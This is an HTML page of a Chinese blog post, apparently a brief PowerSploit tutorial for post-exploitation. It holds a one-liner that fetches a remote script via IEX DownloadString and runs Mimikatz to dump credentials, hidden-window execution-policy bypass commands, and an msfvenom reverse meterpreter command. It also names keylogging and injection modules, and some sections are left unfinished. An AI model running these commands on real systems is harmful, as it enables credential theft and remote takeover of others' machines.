@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com">
+  
+  
+  
+  <title>Powersploit使用小结 | Leavky</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="工具,内网渗透,工具,">
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">Leavky.com</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a href="/categories/" target="_self">
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a href="/tags/" target="_self">
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a href="/friends/" target="_self">
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a href="/about/" target="_self">
+              关于
+            </a>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>Powersploit使用小结</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-01-16
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/工具/">
+            工具
+          </a>
+      </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><h2 id="2-PowerShell"><a href="#2-PowerShell" class="headerlink" title="2 PowerShell"></a>2 PowerShell</h2><p>poweshell是cmd.exe的扩充，可以直接使用<code>.net</code>。可以使用<code>Get-Host</code>来查看powershell当前的版本。</p>
+<h3 id="2-1-PowerShell-常用命令"><a href="#2-1-PowerShell-常用命令" class="headerlink" title="2.1 PowerShell 常用命令"></a>2.1 PowerShell 常用命令</h3><ol>
+<li>本地权限绕过执行<br><code>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1</code></li>
+<li>本地隐藏权限绕过执行脚本<br><code>PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive-NoProfile -WindowStyle Hidden(隐藏窗口) -File xxx.ps1</code></li>
+<li>直接用IEX下载远程的PS1脚本回来权限绕过执行<br><code>powershell &quot;IEX (New-ObjectNet.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&quot;</code></li>
+</ol>
+<h2 id="3-Powersploit"><a href="#3-Powersploit" class="headerlink" title="3 Powersploit"></a>3 Powersploit</h2><h3 id="3-1-项目简介"><a href="#3-1-项目简介" class="headerlink" title="3.1 项目简介"></a>3.1 项目简介</h3><p>一款基于powershell的后渗透（Post-Exploitation）框架，集成大量渗透相关模块和功能。可以在github下载：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">项目地址</a>。</p>
+<p>下载完成后可以使用python开启服务器，<code>python3 -m http.server 8080</code>。</p>
+<p><img src="http://ozrtrbf6a.bkt.clouddn.com/18-2-21/86879948.jpg" alt=""></p>
+<h3 id="3-2-常用脚本"><a href="#3-2-常用脚本" class="headerlink" title="3.2 常用脚本"></a>3.2 常用脚本</h3><p>记录常用脚本。</p>
+<h4 id="3-2-1-代码执行"><a href="#3-2-1-代码执行" class="headerlink" title="3.2.1 代码执行"></a>3.2.1 代码执行</h4><h5 id="3-2-1-1-Invoke-Shellcode"><a href="#3-2-1-1-Invoke-Shellcode" class="headerlink" title="3.2.1.1 Invoke-Shellcode"></a>3.2.1.1 Invoke-Shellcode</h5><p>Invoke-Shellcode的作用是：将shellcode插入您选择的进程ID或本地PowerShell中。<br>与Metasploit配合可以出其不意。<br>首先生成反弹木马：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_https lhost=10.10.10.137 lport=7788 -f powershell -o /root/mytool/msf</code></p>
+<p>win7下载：</p>
+<h5 id="3-2-1-1-Invoke-DllInjection"><a href="#3-2-1-1-Invoke-DllInjection" class="headerlink" title="3.2.1.1 Invoke-DllInjection"></a>3.2.1.1 Invoke-DllInjection</h5><p>Invoke-DllInjection的作用是注入dll。</p>
+<h4 id="3-2-2-内网信息侦察"><a href="#3-2-2-内网信息侦察" class="headerlink" title="3.2.2 内网信息侦察"></a>3.2.2 内网信息侦察</h4><h5 id="3-2-2-1-Invoke-Portscan"><a href="#3-2-2-1-Invoke-Portscan" class="headerlink" title="3.2.2.1 Invoke-Portscan"></a>3.2.2.1 Invoke-Portscan</h5><p>Invoke-Portscan的作用是扫描内网信息。</p>
+<h4 id="3-2-3-主机信息侦察"><a href="#3-2-3-主机信息侦察" class="headerlink" title="3.2.3 主机信息侦察"></a>3.2.3 主机信息侦察</h4><h5 id="3-2-3-1-Invoke-Mimikatz"><a href="#3-2-3-1-Invoke-Mimikatz" class="headerlink" title="3.2.3.1 Invoke-Mimikatz"></a>3.2.3.1 Invoke-Mimikatz</h5><p>Invoke-Mimikatz的作用是抓取管理员密码。</p>
+<h5 id="3-2-3-2-Get-Keystrokes"><a href="#3-2-3-2-Get-Keystrokes" class="headerlink" title="3.2.3.2 Get-Keystrokes"></a>3.2.3.2 Get-Keystrokes</h5><p>键盘记录。</p>
+<h5 id="3-2-3-2-Get-Keystrokes-1"><a href="#3-2-3-2-Get-Keystrokes-1" class="headerlink" title="3.2.3.2 Get-Keystrokes"></a>3.2.3.2 Get-Keystrokes</h5><p>Invoke-NinjaCopy的作用是复制文件。</p>
+<h3 id="3-3-查看帮助文档"><a href="#3-3-查看帮助文档" class="headerlink" title="3.3 查看帮助文档"></a>3.3 查看帮助文档</h3><p>首先导入模块：<code>Import-Module .\PowerSploit</code><br>查看帮助<code>Get-Help PowerSploit</code></p>
+<p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-21/73279778.jpg" alt=""></p>
+<p>更详细的查看每个脚本的帮助文件。</p>
+<p><img src="index_files/2fc2bfac-2dc1-42b3-84b4-25a80653ff77.png" alt=""></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>powershell可以得到意想不到的效果，多加利用。</p>
+<h2 id="End-参考资料"><a href="#End-参考资料" class="headerlink" title="End 参考资料"></a>End 参考资料</h2><p><a href="http://www.freebuf.com/sectool/131275.html" target="_blank" rel="noopener">1. 说说Powersploit在内网渗透中的使用</a></p>
+<p><a href="https://www.anquanke.com/post/id/84728" target="_blank" rel="noopener">2. 渗透利器之Powershell</a></p>
+<p><a href="http://www.freebuf.com/articles/system/8130.html" target="_blank" rel="noopener">3. PowerSploit+Metasploit=Shells</a></p>
+<p><a href="http://www.360doc.com/content/17/0222/19/35182558_631193353.shtml" target="_blank" rel="noopener">4. Powershell &amp; Powersploit 入门</a></p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : leavky <br>
+        
+        原文链接 : <a href="">http://yoursite.com/2019/01/16/Powersploit使用小结/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/内网渗透/">
+              #内网渗透
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/工具/">
+              #工具
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2019/01/16/PHP文件包含漏洞/" target="_self">PHP文件包含漏洞小结</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2019/01/16/常见源码泄露/" target="_self">常见源码泄露</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "jTCdtlhqGDp1dmfoL7X1CoNK-gzGzoHsz",
+      appKey: "bEQmOmCRmRvcNNbMzWsyAO5Q",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2018, 1, 10).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
